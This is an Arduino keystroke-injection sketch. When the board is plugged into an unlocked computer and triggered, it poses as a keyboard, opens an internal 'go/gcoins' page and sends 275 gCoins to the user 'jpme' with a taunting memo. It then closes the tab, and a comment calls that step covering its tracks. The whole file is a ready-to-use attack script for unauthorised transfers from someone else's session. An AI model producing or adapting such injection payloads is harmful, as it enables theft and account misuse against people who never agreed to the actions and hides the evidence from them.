// KEY_LEFT_CTRL for Windows/Linux
// KEY_LEFT_GUI for Mac
char ctrlKey = KEY_LEFT_CTRL;

// Variable for the Tab key (universal)
char tab = KEY_TAB;

// Variable for the Enter key (universal)
char enter = KEY_RETURN;

// Username string for who is RECEIVING the gcoins
String username = "jpme";

// The amount in gCoins that are getting taken
int gcoinAmount = 275;

// How long to delay the start (note: there is a required 1 sec delay)
int delayToStart = 000;

void setup() {
  // make pin 2 an input and turn on the 
  // pullup resistor so it goes high unless
  // connected to ground:
  pinMode(2, INPUT_PULLUP);
  Keyboard.begin();
  // Must be at LEAST 1000 for the keyboard to init
  delay(1000);
}

void loop() {
  while (digitalRead(2) == LOW) {
    // do nothing until pin 2 goes low
    delay(500);
  }

  delay(delayToStart);

  // Ctrl+T for new tab
  Keyboard.press(ctrlKey);
  Keyboard.press('t');
  delay(100);
  Keyboard.releaseAll();

  delay(750);

  // URL
  Keyboard.print("go/gcoins");
  delay(100);

  // Press Enter for that URL
  Keyboard.press(enter);
  delay(100);
  Keyboard.releaseAll();

  // Wait for the page to load
  delay(1500);

  // Press Tab 8 times
  for(int i = 0; i < 8; i++){
    Keyboard.press(tab);
    delay(50);
    Keyboard.releaseAll();
  }

  // Press Enter
  Keyboard.press(enter);
  delay(100);
  Keyboard.releaseAll();

  // Wait for the gCoins window to show itself
  delay(500);

  // Type in your username
  Keyboard.print(username);

  // Go to the amount text box
  Keyboard.press(tab);
  delay(100);
  Keyboard.releaseAll();

  // Type in amount
  Keyboard.print(gcoinAmount);

  // Tab twice to the Send button
  Keyboard.press(tab);
  delay(100);
  Keyboard.releaseAll();

  Keyboard.print("At least I didn't take them all!");

  Keyboard.press(tab);
  delay(100);
  Keyboard.releaseAll();

  // Press Send
  Keyboard.press(enter);
  delay(100);
  Keyboard.releaseAll();

  // Allow the page to load
  delay(500);

  // Close tab and cover your tracks
  Keyboard.press(ctrlKey);
  Keyboard.press('w');
  delay(100);
  Keyboard.releaseAll();

  // Very important: this prevents the loop 
  // from happening over and over and over...
  while(true);

}

